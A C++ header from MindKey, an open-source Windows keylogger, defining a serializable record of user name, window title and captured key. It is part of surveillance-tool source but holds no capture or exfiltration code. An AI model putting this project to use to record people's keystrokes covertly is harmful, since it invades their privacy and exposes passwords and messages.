/* MindKey, Keylogger for Windows. 
 * While this program can potentially be used for nefarious purposes, 
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 Blackhack <https://github.com/blackhack/MindKey/>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef SERIALIZATION_STRUCT_H
#define SERIALIZATION_STRUCT_H

#include <string>

#define SERIALIZE_VERSION 2

//Estructura para guardar y serializar los datos.
struct KeyDataStruct
{
    std::string User;
    std::string WindowTitle;
    std::string Key;

    template <typename Archive>
    void serialize(Archive& ar, const unsigned int version)
    {
        ar & User;
        ar & WindowTitle;
        ar & Key;
    }
};

BOOST_CLASS_VERSION(KeyDataStruct, SERIALIZE_VERSION)

#endif // SERIALIZATION_STRUCT_H
